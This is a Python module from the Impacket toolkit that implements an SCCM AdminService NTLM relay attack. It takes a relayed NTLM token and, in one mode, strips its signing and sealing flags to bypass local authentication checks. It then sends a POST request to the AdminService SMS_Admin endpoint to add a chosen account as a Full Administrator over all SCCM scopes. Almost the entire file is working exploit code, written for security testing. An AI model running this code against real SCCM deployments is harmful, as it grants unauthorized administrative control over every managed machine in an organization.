# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM AdminService relay attack
#
# Authors:
#   Garrett Foster (@garrfoster)
#   Tw1sm (@Tw1sm)

from impacket import LOG
from struct import unpack
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.ntlm import NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SEAL
import json
import base64

ELEVATED = []

class ADMINSERVICEAttack:
    def _run(self):
        # slightly modfied sendAuth func from httprelayclient.py reused here due to negotiate auth,
        # requring all action to be performed in one shot

        # In test mode, we don't skip users - we want to test repeatedly
        if not self.config.testAdminService:
            if self.username in ELEVATED:
                LOG.info('Skipping user %s since attack was already performed' % self.username)
                return
        
        if unpack('B', self.config.sccmAdminToken[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(self.config.sccmAdminToken)
            token = respToken2['ResponseToken']
        else:
            token = self.config.sccmAdminToken

        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
        if self.config.remove_mic_partial:
            LOG.debug('Applying remove_mic_partial processing to AdminService token')
            authMessage = NTLMAuthChallengeResponse()
            authMessage.fromString(token)
            original_flags = authMessage['flags']
            LOG.debug(f'Original NTLM flags: 0x{original_flags:08x}')

            # Remove SIGN, ALWAYS_SIGN, and SEAL flags
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
                LOG.debug('Removed NTLMSSP_NEGOTIATE_SIGN flag')
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
                LOG.debug('Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag')
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
                LOG.debug('Removed NTLMSSP_NEGOTIATE_SEAL flag')

            LOG.debug(f'Modified NTLM flags: 0x{authMessage["flags"]:08x}')
            # Do NOT remove KEY_EXCH or VERSION flags
            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
            token = authMessage.getData()

        auth = base64.b64encode(token).decode("ascii")
        headers = {'Authorization':'%s %s' % ('Negotiate', auth),'Content-Type': 'application/json; odata=verbose'}

        # Test mode: just test authentication with GET request
        if self.config.testAdminService:
            LOG.info('Testing AdminService authentication (test mode - no attack)...')
            LOG.debug(f'Request URL: /AdminService/wmi/SMS_Admin')
            LOG.debug(f'Request headers: {headers}')
            LOG.debug(f'Token (base64): {auth[:80]}...')

            self.client.request("GET", '/AdminService/wmi/SMS_Admin', headers=headers)
            res = self.client.getresponse()

            LOG.info(f'=== AdminService Authentication Test Result ===')
            LOG.info(f'HTTP Status: {res.status} {res.reason}')
            LOG.info(f'Response Headers:')
            for header, value in res.getheaders():
                LOG.info(f'  {header}: {value}')

            # Read response body
            response_body = res.read()
            if response_body:
                try:
                    response_text = response_body.decode('utf-8')
                    LOG.info(f'Response Body ({len(response_body)} bytes):')
                    LOG.info(response_text)
                except:
                    LOG.info(f'Response Body ({len(response_body)} bytes, binary):')
                    LOG.info(response_body[:500])
            else:
                LOG.info('Response Body: (empty)')

            # Analyze result
            if res.status == 200:
                LOG.info('[+] SUCCESS: Authentication accepted (200 OK)')
            elif res.status == 401:
                LOG.error('[-] FAILED: Authentication rejected (401 Unauthorized)')
            elif res.status == 403:
                LOG.info('[+] Authentication succeeded but insufficient permissions (403 Forbidden)')
            elif res.status == 500:
                LOG.info('[?] Server error (500) - authentication may have succeeded')
            else:
                LOG.info(f'[?] Unexpected status: {res.status}')

            LOG.info('=== End Test Result ===')
            return

        # Normal attack mode: POST to create admin
        data = {
            "LogonName": self.config.logonname,
            "AdminSid": self.config.objectsid,
            "Permissions": [
                {
                    "CategoryID": "SMS00ALL",
                    "CategoryTypeID": 29,
                    "RoleID":"SMS0001R",
                },
                {
                    "CategoryID": "SMS00001",
                    "CategoryTypeID": 1,
                    "RoleID":"SMS0001R",
                },
                {
                    "CategoryID": "SMS00004",
                    "CategoryTypeID": 1,
                    "RoleID":"SMS0001R",
                }
            ],
            "DisplayName": self.config.displayname
        }

        body = json.dumps(data)

        LOG.info('Adding administrator via SCCM AdminService...')
        LOG.debug(f'Request URL: /AdminService/wmi/SMS_Admin')
        LOG.debug(f'Request headers: {headers}')
        LOG.debug(f'Request body: {body}')
        self.client.request("POST", '/AdminService/wmi/SMS_Admin', headers=headers, body=body)
        ELEVATED.append(self.username)
        res = self.client.getresponse()

        if res.status == 201:
            LOG.info('Server returned code 201, attack successful')
        else:
            self.lastresult = res.read()
            LOG.error(f'Server returned code {res.status} - attack likely failed')
            LOG.error(f'Response headers: {dict(res.getheaders())}')
            try:
                if self.lastresult:
                    response_text = self.lastresult.decode("utf-8")
                    LOG.error(f'Response body: {response_text}')
                else:
                    LOG.error('Response body is empty')
            except Exception as e:
                LOG.error(f'Error decoding response: {e}')
                LOG.error(f'Raw response (first 500 bytes): {self.lastresult[:500]}')
